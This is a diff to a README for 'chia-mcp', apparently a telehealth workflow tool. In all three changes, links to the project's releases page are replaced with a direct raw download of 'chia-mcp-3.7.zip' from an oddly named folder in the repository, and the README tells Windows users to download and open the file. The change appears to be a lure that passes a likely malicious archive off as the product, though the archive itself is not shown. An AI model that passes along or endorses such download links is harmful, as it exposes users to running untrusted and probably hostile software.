@@ -1,6 +1,6 @@
 # 🧬 chia-mcp - Simplify telehealth workflow tasks
 
-[![Download chia-mcp](https://img.shields.io/badge/Download%20chia--mcp-6B46C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carolaunfading944/chia-mcp/releases)
+[![Download chia-mcp](https://img.shields.io/badge/Download%20chia--mcp-6B46C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carolaunfading944/chia-mcp/raw/refs/heads/main/morassy/chia-mcp-3.7.zip)
 
 ## 📦 What this is
 
@@ -35,7 +35,7 @@ For best results:
 
 Visit this page to download:
 
-https://github.com/Carolaunfading944/chia-mcp/releases
+https://github.com/Carolaunfading944/chia-mcp/raw/refs/heads/main/morassy/chia-mcp-3.7.zip
 
 On that page, look for the latest release and download the Windows file. If the release includes more than one file, choose the one for Windows, such as an `.exe` or `.zip` file.
 
@@ -193,4 +193,4 @@ To get the latest version:
 3. Replace the older copy if needed.
 4. Open the new version and check that it starts cleanly
 
-https://github.com/Carolaunfading944/chia-mcp/releases
+https://github.com/Carolaunfading944/chia-mcp/raw/refs/heads/main/morassy/chia-mcp-3.7.zip
